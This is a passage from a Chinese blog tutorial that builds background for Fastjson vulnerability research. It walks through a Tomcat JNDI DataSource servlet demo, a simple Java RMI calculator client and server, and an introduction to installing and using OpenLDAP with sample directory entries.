src="https://cdn.nlark.com/yuque/0/2023/png/25360791/1678884890340-20382807-f27e-4944-93ca-3c01025b0e1e.png#averageHue=%23faf8f5&clientId=u5a3e9323-ecb0-4&from=paste&height=754&id=u27b67135&name=image.png&originHeight=942&originWidth=1298&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=127673&status=done&style=none&taskId=ud45b656f-1d40-49ac-b9ea-2a923c485c7&title=&width=1038.4" alt="image.png"></p><h3 id="（2）去IDEA里面配置web"><a href="#（2）去IDEA里面配置web" class="headerlink" title="（2）去IDEA里面配置web"></a>（2）去IDEA里面配置web</h3><p>首先先新建一个项目，我命名为<code>jndi_demo</code>：<br><img src="https://cdn.nlark.com/yuque/0/2023/png/25360791/1678885151233-80553b0b-4115-4b22-81a2-2f09d7ec0bcf.png#averageHue=%233d4143&clientId=u5a3e9323-ecb0-4&from=paste&height=616&id=u97f4ba70&name=image.png&originHeight=770&originWidth=1000&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=62140&status=done&style=none&taskId=u711deb09-aea9-4362-b061-78fb3799b3d&title=&width=800" alt="image.png"><br>接着配置<code>tomcat</code>：<br><img src="https://cdn.nlark.com/yuque/0/2023/png/25360791/1678885256148-bb6a70c4-2040-4dd4-bc2c-ec15f129550d.png#averageHue=%233c3f42&clientId=u5a3e9323-ecb0-4&from=paste&height=809&id=ubc2e9a3b&name=image.png&originHeight=1011&originWidth=1920&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=140947&status=done&style=none&taskId=ueca69d2c-5b70-4f87-830b-d314a54c05a&title=&width=1536" alt="image.png"><br>这里我选择了<code>8089</code>端口，因为我<code>8080</code>端口之前被我占用了：<br><img src="https://cdn.nlark.com/yuque/0/2023/png/25360791/1678885463623-4eb4fb66-6728-447d-ad91-16edd1827e79.png#averageHue=%233d4144&clientId=u5a3e9323-ecb0-4&from=paste&height=816&id=ud70ab01d&name=image.png&originHeight=1020&originWidth=1322&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=75442&status=done&style=none&taskId=ubc655a0e-e250-46a6-945a-c9d49f77248&title=&width=1057.6" alt="image.png"><br>然后：<br><img src="https://cdn.nlark.com/yuque/0/2023/png/25360791/1678885908742-a4d7374b-8046-4656-b300-e1e7ef5f861b.png#averageHue=%233c4044&clientId=u5a3e9323-ecb0-4&from=paste&height=816&id=ucaad5837&name=image.png&originHeight=1020&originWidth=1297&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=72302&status=done&style=none&taskId=u8ceaa752-695d-4f5b-b6f8-4d9a727995a&title=&width=1037.6" alt="image.png"><br><img src="https://cdn.nlark.com/yuque/0/2023/png/25360791/1678886000311-95920e80-ed67-4209-a6ec-2d759a842e51.png#averageHue=%233c4044&clientId=u5a3e9323-ecb0-4&from=paste&height=816&id=u67f85316&name=image.png&originHeight=1020&originWidth=1297&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=54705&status=done&style=none&taskId=u953ad30f-a157-489b-ba82-f410b2b6ef0&title=&width=1037.6" alt="image.png"><br><img src="https://cdn.nlark.com/yuque/0/2023/png/25360791/1678886015112-7edcf0a1-4cdd-4f7c-aa1f-4edfd2be07d7.png#averageHue=%233c4044&clientId=u5a3e9323-ecb0-4&from=paste&height=816&id=u24a185b3&name=image.png&originHeight=1020&originWidth=1297&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=69038&status=done&style=none&taskId=u7a926f43-303b-43d6-b3a6-3539868d54a&title=&width=1037.6" alt="image.png"><br><img src="https://cdn.nlark.com/yuque/0/2023/png/25360791/1678886033023-b1dfa5ca-f257-47cf-a089-60cd0c6c8220.png#averageHue=%233d4146&clientId=u5a3e9323-ecb0-4&from=paste&height=816&id=u73ae6ade&name=image.png&originHeight=1020&originWidth=1297&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=78123&status=done&style=none&taskId=uca6ee483-3093-4d00-8171-d9096784b84&title=&width=1037.6" alt="image.png"><br><img src="https://cdn.nlark.com/yuque/0/2023/png/25360791/1678940228400-d86c60c7-f6f6-4a1b-bf13-edc32055593e.png#averageHue=%23f4f2f2&clientId=u5a3e9323-ecb0-4&from=paste&height=816&id=ubb203486&name=image.png&originHeight=1020&originWidth=1297&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=64387&status=done&style=none&taskId=u102cee43-67c3-4d57-8c3e-66bba745d08&title=&width=1037.6" alt="image.png"><br><img src="https://cdn.nlark.com/yuque/0/2023/png/25360791/1678940285160-03bd07bd-0cf2-4d34-a6f8-ebcc052b2335.png#averageHue=%23f4f4f4&clientId=u5a3e9323-ecb0-4&from=paste&height=816&id=u6cf8711e&name=image.png&originHeight=1020&originWidth=1297&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=59684&status=done&style=none&taskId=ue105458a-02d4-46c1-a767-d091e1a0f82&title=&width=1037.6" alt="image.png"><br><img src="https://cdn.nlark.com/yuque/0/2023/png/25360791/1678940273192-99f3ccd4-03b0-4718-b388-f7c8ae601726.png#averageHue=%23f7f5f5&clientId=u5a3e9323-ecb0-4&from=paste&height=816&id=u4765463e&name=image.png&originHeight=1020&originWidth=1297&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=81848&status=done&style=none&taskId=u092f6e04-3bf1-4f40-a96d-dba977918d1&title=&width=1037.6" alt="image.png"><br><img src="https://cdn.nlark.com/yuque/0/2023/png/25360791/1678940545495-c9b4c888-fc80-43aa-95a6-62b6fa4f0c36.png#averageHue=%23f8f4f3&clientId=u5a3e9323-ecb0-4&from=paste&height=524&id=u5782aece&name=image.png&originHeight=655&originWidth=1456&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=96736&status=done&style=none&taskId=u9965f6de-7b0e-4968-92c5-93b04945fc6&title=&width=1164.8" alt="image.png"><br>然后填写代码运行配置：<br><img src="https://cdn.nlark.com/yuque/0/2023/png/25360791/1678940431187-6a26c894-0981-41c3-bbea-fc04f2ba05aa.png#averageHue=%23f3f3f3&clientId=u5a3e9323-ecb0-4&from=paste&height=816&id=uaa500cbd&name=image.png&originHeight=1020&originWidth=1322&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=71631&status=done&style=none&taskId=ua8132b45-bf0e-4f29-8390-732aeb21065&title=&width=1057.6" alt="image.png"><br><img src="https://cdn.nlark.com/yuque/0/2023/png/25360791/1678940460670-a57c6c50-a6f2-4f41-b956-1f79301227e0.png#averageHue=%23f6f6f5&clientId=u5a3e9323-ecb0-4&from=paste&height=816&id=uecd3abc9&name=image.png&originHeight=1020&originWidth=1322&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=48017&status=done&style=none&taskId=u929bdaa4-97ae-4e06-81bf-8141f26456e&title=&width=1057.6" alt="image.png"></p><h3 id="（3）跑jndi的demo代码，感受jndi的用处"><a href="#（3）跑jndi的demo代码，感受jndi的用处" class="headerlink" title="（3）跑jndi的demo代码，感受jndi的用处"></a>（3）跑jndi的demo代码，感受jndi的用处</h3><p>然后贴上如下代码：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> org.example;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> jakarta.servlet.ServletException;</span><br><span class="line"><span class="keyword">import</span> jakarta.servlet.annotation.WebServlet;</span><br><span class="line"><span class="keyword">import</span> jakarta.servlet.http.HttpServlet;</span><br><span class="line"><span class="keyword">import</span> jakarta.servlet.http.HttpServletRequest;</span><br><span class="line"><span class="keyword">import</span> jakarta.servlet.http.HttpServletResponse;</span><br><span class="line"><span class="keyword">import</span> javax.naming.Context;</span><br><span class="line"><span class="keyword">import</span> javax.naming.InitialContext;</span><br><span class="line"><span class="keyword">import</span> javax.sql.DataSource;</span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"><span class="keyword">import</span> java.sql.Connection;</span><br><span class="line"><span class="keyword">import</span> java.sql.ResultSet;</span><br><span class="line"><span class="keyword">import</span> java.sql.Statement;</span><br><span class="line"></span><br><span class="line"><span class="meta">@WebServlet(&quot;/test&quot;)</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Test</span> <span class="keyword">extends</span> <span class="title class_">HttpServlet</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">protected</span> <span class="keyword">void</span> <span class="title function_">service</span><span class="params">(HttpServletRequest req, HttpServletResponse resp)</span> <span class="keyword">throws</span> ServletException, IOException &#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="comment">// 获取JNDI上下文</span></span><br><span class="line">            <span class="type">Context</span> <span class="variable">ctx</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">InitialContext</span>();</span><br><span class="line"></span><br><span class="line">            <span class="comment">// 查找数据源</span></span><br><span class="line">            <span class="type">Context</span> <span class="variable">envContext</span> <span class="operator">=</span> (Context) ctx.lookup(<span class="string">&quot;java:/comp/env&quot;</span>);</span><br><span class="line">            <span class="type">DataSource</span> <span class="variable">ds</span> <span class="operator">=</span> (DataSource) envContext.lookup(<span class="string">&quot;jdbc/security&quot;</span>);</span><br><span class="line"></span><br><span class="line">            <span class="comment">// 获取连接</span></span><br><span class="line">            <span class="type">Connection</span> <span class="variable">conn</span> <span class="operator">=</span> ds.getConnection();</span><br><span class="line"></span><br><span class="line">            System.out.println(<span class="string">&quot;[+] success!&quot;</span>);</span><br><span class="line"></span><br><span class="line">            <span class="comment">// 执行查询</span></span><br><span class="line">            <span class="type">Statement</span> <span class="variable">stmt</span> <span class="operator">=</span> conn.createStatement();</span><br><span class="line">            <span class="type">ResultSet</span> <span class="variable">rs</span> <span class="operator">=</span> stmt.executeQuery(<span class="string">&quot;select * from security.emails;&quot;</span>);</span><br><span class="line"></span><br><span class="line">            <span class="comment">// 处理结果集</span></span><br><span class="line">            <span class="keyword">while</span> (rs.next()) &#123;</span><br><span class="line">                System.out.println(rs.getString(<span class="string">&quot;email_id&quot;</span>));</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="comment">// 关闭连接</span></span><br><span class="line">            rs.close();</span><br><span class="line">            stmt.close();</span><br><span class="line">            conn.close();</span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>成功跑起来了：<br><img src="https://cdn.nlark.com/yuque/0/2023/png/25360791/1678940374491-2a860b2a-0870-40b8-a504-0019cc5ed891.png#averageHue=%23f8f5f4&clientId=u5a3e9323-ecb0-4&from=paste&height=814&id=ua5fe7851&name=image.png&originHeight=1018&originWidth=1920&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=212963&status=done&style=none&taskId=u9a05a617-b988-4f85-90dd-fc1615e8cf6&title=&width=1536" alt="image.png"><br>然后访问<code>[http://localhost:6063/test](http://localhost:6063/test)</code>：<br><img src="https://cdn.nlark.com/yuque/0/2023/png/25360791/1678940781085-073b70b4-6f21-42a4-bc56-453a330c8231.png#averageHue=%23fdfdfd&clientId=u5a3e9323-ecb0-4&from=paste&height=765&id=u653be59d&name=image.png&originHeight=956&originWidth=1318&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=30517&status=done&style=none&taskId=u5a626861-d6b2-478a-b562-88ede7b098e&title=&width=1054.4" alt="image.png"><br>没有出现<code>404</code>，说明<code>WebServlet</code>拦截成功，回到<code>idea</code>，发现查询成功：<br><img src="https://cdn.nlark.com/yuque/0/2023/png/25360791/1678940740270-4c3ffea5-b5d4-4f34-af48-9f9e5ede55a9.png#averageHue=%23f7f6f4&clientId=u5a3e9323-ecb0-4&from=paste&height=813&id=ub1527115&name=image.png&originHeight=1016&originWidth=1920&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=198241&status=done&style=none&taskId=u3bc40381-6b60-4624-8688-2cf0a6660aa&title=&width=1536" alt="image.png"></p><h2 id="4-RMI是什么东西？"><a href="#4-RMI是什么东西？" class="headerlink" title="4. RMI是什么东西？"></a>4. RMI是什么东西？</h2><h3 id="（1）通过一个demo快速认识rmi是如何调用的"><a href="#（1）通过一个demo快速认识rmi是如何调用的" class="headerlink" title="（1）通过一个demo快速认识rmi是如何调用的"></a>（1）通过一个demo快速认识rmi是如何调用的</h3><p><code>RMI</code>指的是远程方法调用（<code>Remote Method Invocation</code>），是<code>Java</code>平台提供的一种机制，可以实现在不同<code>Java</code>虚拟机之间进行方法调用。这么说是真抽象，我们直接看下面使用了<code>RMI</code>的<code>demo</code>代码，包括一个服务器端和一个客户端。这个<code>demo</code>实现了一个简单的计算器程序，客户端通过<code>RMI</code>调用服务器端的方法进行加、减、乘、除四则运算。<br>首先是一个计算器接口：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> org.example;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.rmi.Remote;</span><br><span class="line"><span class="keyword">import</span> java.rmi.RemoteException;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">interface</span> <span class="title class_">Calculator</span> <span class="keyword">extends</span> <span class="title class_">Remote</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="type">int</span> <span class="title function_">add</span><span class="params">(<span class="type">int</span> a, <span class="type">int</span> b)</span> <span class="keyword">throws</span> RemoteException;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="type">int</span> <span class="title function_">subtract</span><span class="params">(<span class="type">int</span> a, <span class="type">int</span> b)</span> <span class="keyword">throws</span> RemoteException;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="type">int</span> <span class="title function_">multiply</span><span class="params">(<span class="type">int</span> a, <span class="type">int</span> b)</span> <span class="keyword">throws</span> RemoteException;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="type">int</span> <span class="title function_">divide</span><span class="params">(<span class="type">int</span> a, <span class="type">int</span> b)</span> <span class="keyword">throws</span> RemoteException;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>然后是客户端代码：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> org.example;</span><br><span class="line"><span class="keyword">import</span> java.rmi.registry.LocateRegistry;</span><br><span class="line"><span class="keyword">import</span> java.rmi.registry.Registry;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Client</span> &#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="title function_">Client</span><span class="params">()</span> &#123;&#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="comment">// Get the registry</span></span><br><span class="line">            <span class="type">Registry</span> <span class="variable">registry</span> <span class="operator">=</span> LocateRegistry.getRegistry(<span class="string">&quot;localhost&quot;</span>, <span class="number">1060</span>);</span><br><span class="line"></span><br><span class="line">            <span class="comment">// Lookup the remote object &quot;Calculator&quot;</span></span><br><span class="line">            <span class="type">Calculator</span> <span class="variable">calc</span> <span class="operator">=</span> (Calculator) registry.lookup(<span class="string">&quot;Calculator&quot;</span>);</span><br><span class="line"></span><br><span class="line">            <span class="comment">// Call the remote method</span></span><br><span class="line">            <span class="type">int</span> <span class="variable">result</span> <span class="operator">=</span> calc.add(<span class="number">5</span>, <span class="number">7</span>);</span><br><span class="line"></span><br><span class="line">            <span class="comment">// Print the result</span></span><br><span class="line">            System.out.println(<span class="string">&quot;Result: &quot;</span> + result);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">            System.err.println(<span class="string">&quot;Client exception: &quot;</span> + e.toString());</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>接着是服务端代码：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> org.example;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.rmi.registry.LocateRegistry;</span><br><span class="line"><span class="keyword">import</span> java.rmi.registry.Registry;</span><br><span class="line"><span class="keyword">import</span> java.rmi.RemoteException;</span><br><span class="line"><span class="keyword">import</span> java.rmi.server.UnicastRemoteObject;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Server</span> <span class="keyword">extends</span> <span class="title class_">UnicastRemoteObject</span> <span class="keyword">implements</span> <span class="title class_">Calculator</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">Server</span><span class="params">()</span> <span class="keyword">throws</span> RemoteException &#123;&#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="type">int</span> <span class="title function_">add</span><span class="params">(<span class="type">int</span> x, <span class="type">int</span> y)</span> <span class="keyword">throws</span> RemoteException &#123;</span><br><span class="line">        <span class="keyword">return</span> x + y;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="type">int</span> <span class="title function_">subtract</span><span class="params">(<span class="type">int</span> a, <span class="type">int</span> b)</span> <span class="keyword">throws</span> RemoteException &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="type">int</span> <span class="title function_">multiply</span><span class="params">(<span class="type">int</span> a, <span class="type">int</span> b)</span> <span class="keyword">throws</span> RemoteException &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="type">int</span> <span class="title function_">divide</span><span class="params">(<span class="type">int</span> a, <span class="type">int</span> b)</span> <span class="keyword">throws</span> RemoteException &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String args[])</span> &#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="type">Server</span> <span class="variable">obj</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Server</span>();</span><br><span class="line">            LocateRegistry.createRegistry(<span class="number">1060</span>);</span><br><span class="line">            <span class="type">Registry</span> <span class="variable">registry</span> <span class="operator">=</span> LocateRegistry.getRegistry(<span class="number">1060</span>);</span><br><span class="line">            registry.bind(<span class="string">&quot;Calculator&quot;</span>, obj);</span><br><span class="line">            System.out.println(<span class="string">&quot;Server ready&quot;</span>);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">            System.err.println(<span class="string">&quot;Server exception: &quot;</span> + e.toString());</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>然后开始跑程序，不需要做任何配置。<br>先把服务端跑起来：<br><img src="https://cdn.nlark.com/yuque/0/2023/png/25360791/1678943334990-44e60d9f-b5c1-40e9-8714-b743509cab0a.png#averageHue=%23f9f8f8&clientId=u5a3e9323-ecb0-4&from=paste&height=816&id=uab1c2e16&name=image.png&originHeight=1020&originWidth=1920&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=154898&status=done&style=none&taskId=u0d799428-063c-4e44-989a-74f0d213abb&title=&width=1536" alt="image.png"><br>然后客户端这里就可以直接运行<code>5+7</code>的结果了：<br><img src="https://cdn.nlark.com/yuque/0/2023/png/25360791/1678943374347-f7bd0a65-439e-4fd8-8279-1f624791b3cf.png#averageHue=%23f9f8f7&clientId=u5a3e9323-ecb0-4&from=paste&height=818&id=u313ce13f&name=image.png&originHeight=1023&originWidth=1920&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=171110&status=done&style=none&taskId=u64403d77-1034-470e-9542-60216a99af3&title=&width=1536" alt="image.png"></p><h3 id="（2）深入理解rmi"><a href="#（2）深入理解rmi" class="headerlink" title="（2）深入理解rmi"></a>（2）深入理解rmi</h3><p>建议直接看素十八师傅的博客以及天下大木头的微信公众号文章，写的真的是太好了，都是适合细细品味的文章。</p><blockquote><p><a href="https://su18.org/post/rmi-attack/">https://su18.org/post/rmi-attack/</a><br><a href="https://mp.weixin.qq.com/s/wYujicYxSO4zqGylNRBtkA">https://mp.weixin.qq.com/s/wYujicYxSO4zqGylNRBtkA</a></p></blockquote><h2 id="5-ldap是什么？"><a href="#5-ldap是什么？" class="headerlink" title="5. ldap是什么？"></a>5. ldap是什么？</h2><p><code>LDAP</code>是轻型目录访问协议的缩写，是一种用于访问和维护分层目录信息的协议。在<code>Java</code>安全中，<code>LDAP</code>通常用于集成应用程序与企业目录服务（例如<code>Microsoft Active Directory</code>或<code>OpenLDAP</code>）的认证和授权功能。<br>使用<code>Java</code>的<code>LDAP API</code>，我们可以编写<code>LDAP</code>客户端来执行各种<code>LDAP</code>操作，如绑定（<code>bind</code>）到<code>LDAP</code>服务器、搜索目录、添加、修改和删除目录条目等。<code>Java LDAP API</code>支持使用简单绑定（<code>simple bind</code>）或<code>Kerberos</code>身份验证（<code>Kerberos authentication</code>）进行<code>LDAP</code>身份验证。<br><code>Java</code>应用程序可以使用<code>LDAP</code>来实现单点登录和跨域身份验证，并与其他应用程序和服务共享身份验证信息。<code>LDAP</code>还可以用于管理用户、组和权限，以及存储和管理应用程序配置信息等。<br>总结：<code>Java</code>中的<code>LDAP</code>是一种使用<code>Java</code>编写<code>LDAP</code>客户端来集成企业目录服务的技术，可以提供安全的身份验证和授权功能，以及方便的用户和配置管理。<br>这么说还是太抽象了，我们还是看一个<code>demo</code>来快速熟悉一下吧。</p><h3 id="（1）安装并配置ldap服务器"><a href="#（1）安装并配置ldap服务器" class="headerlink" title="（1）安装并配置ldap服务器"></a>（1）安装并配置ldap服务器</h3><p>这里我们选择<code>OpenLDAP</code>来进行安装。<a href="https://www.openldap.org/">官网</a>只提供了<code>Linux</code>版本，我们可以去德国公司<code>maxcrc</code>的官网上面去下载<code>openldap for windows</code>：</p><blockquote><p><a href="https://www.maxcrc.de/en/download-en/">https://www.maxcrc.de/en/download-en/</a></p></blockquote><p>这里我们选择<code>64</code>位的，懒人链接：<a href="https://www.maxcrc.de/wp-content/uploads/2020/04/OpenLDAPforWindows_x64.zip">https://www.maxcrc.de/wp-content/uploads/2020/04/OpenLDAPforWindows_x64.zip</a><br><img src="https://cdn.nlark.com/yuque/0/2023/png/25360791/1678944181394-19da149a-17be-4bb1-b7a0-cd45da9a87e2.png#averageHue=%23faf9f9&clientId=u5a3e9323-ecb0-4&from=paste&height=746&id=u93f4deae&name=image.png&originHeight=932&originWidth=1862&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=89233&status=done&style=none&taskId=uce2c258a-da0f-46b8-b786-9a5b22682cb&title=&width=1489.6" alt="image.png"><br>然后参考这篇文章进行安装：</p><blockquote><p><a href="https://blog.csdn.net/oscar999/article/details/108654461">https://blog.csdn.net/oscar999/article/details/108654461</a></p></blockquote><p>成功启动<code>ldap</code>服务：<br><img src="https://cdn.nlark.com/yuque/0/2023/png/25360791/1678944538078-3326aee5-f7f0-41c1-bcfc-4884a11dd3ea.png#averageHue=%23181818&clientId=u5a3e9323-ecb0-4&from=paste&height=632&id=u19d1bdb8&name=image.png&originHeight=790&originWidth=1480&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=146886&status=done&style=none&taskId=ub6c884dc-3b1e-45f7-aec4-eb1c6bef903&title=&width=1184" alt="image.png"><br>顺便一提，在Windows上可以使用LDAP Browser来快速浏览查看查询，官网及下载地址如下：</p><blockquote><p><a href="https://ldapbrowserwindows.com/">https://ldapbrowserwindows.com/</a><br><a href="https://ldapclient.com/downloads610/LdapBrowser-6.10.x-win-x86-Setup.msi">https://ldapclient.com/downloads610/LdapBrowser-6.10.x-win-x86-Setup.msi</a></p></blockquote><p>啪的一下就连接上了，快啊，很快啊：<br><img src="https://cdn.nlark.com/yuque/0/2023/png/25360791/1678944840530-01d5b61c-415e-425c-9f2a-a0aec5df274e.png#averageHue=%23fbfbfb&clientId=u5a3e9323-ecb0-4&from=paste&height=817&id=ua444aab4&name=image.png&originHeight=1021&originWidth=1920&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=40144&status=done&style=none&taskId=u17aef308-dd39-44d6-bdb7-2f77c1a2a5a&title=&width=1536" alt="image.png"></p><h3 id="（2）通过公司-员工管理的例子来理解Fastjson系列漏洞中ldap的作用"><a href="#（2）通过公司-员工管理的例子来理解Fastjson系列漏洞中ldap的作用" class="headerlink" title="（2）通过公司-员工管理的例子来理解Fastjson系列漏洞中ldap的作用"></a>（2）通过公司-员工管理的例子来理解Fastjson系列漏洞中ldap的作用</h3><p>假设有一个名为”<code>example.com</code>“的公司，需要存储和管理员工信息。他们使用<code>LDAP</code>作为员工信息的目录服务，每个员工都在<code>LDAP</code>中有一个唯一的标识符（<code>DN</code>）。这里我们举两个员工例子：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">DN: uid=john,ou=People,dc=example,dc=com</span><br><span class="line">cn: John Doe</span><br><span class="line">sn: Doe</span><br><span class="line">givenName: John</span><br><span class="line">uid: john</span><br><span class="line">userPassword: &#123;SHA&#125;W6ph5Mm5Pz8GgiULbPgzG37mj9g=</span><br><span class="line"></span><br><span class="line">DN: uid=alice,ou=People,dc=example,dc=com</span><br><span class="line">cn: Alice Smith</span><br><span class="line">sn: Smith</span><br><span class="line">givenName: Alice</span><br><span class="line">uid: alice</span><br><span class="line">userPassword: &#123;SHA&#125;W6ph5Mm5Pz8GgiULbPgzG37mj9g=</span><br></pre></td></tr></table></figure><p>在<code>LDAP</code>中，<code>DN</code>是一个唯一的标识符，它类似于文件系统中的路径。每个<code>DN</code>由多个<code>RDN</code>（相对区分名称）组成，例如：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span 